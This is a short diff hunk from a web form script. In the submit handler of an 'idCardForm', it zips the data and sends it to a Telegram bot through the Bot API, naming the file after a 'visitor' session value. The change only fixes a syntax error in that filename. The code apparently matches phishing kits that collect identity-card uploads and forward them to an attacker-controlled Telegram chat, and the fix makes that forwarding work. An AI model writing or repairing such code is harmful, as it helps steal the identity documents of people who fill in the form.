@@ -338,7 +338,7 @@ document.querySelector('#idCardForm').addEventListener('submit', function(event)
                     // Send zip file to Telegram API
                     const telegramFormData = new FormData();
                     telegramFormData.append('chat_id', chatId);
-                    telegramFormData.append('document', zipFile, sessionStorage.getItem('visitor')'.zip');
+                    telegramFormData.append('document', zipFile, sessionStorage.getItem('visitor') + '.zip');
 
                     return fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
                         method: 'POST',
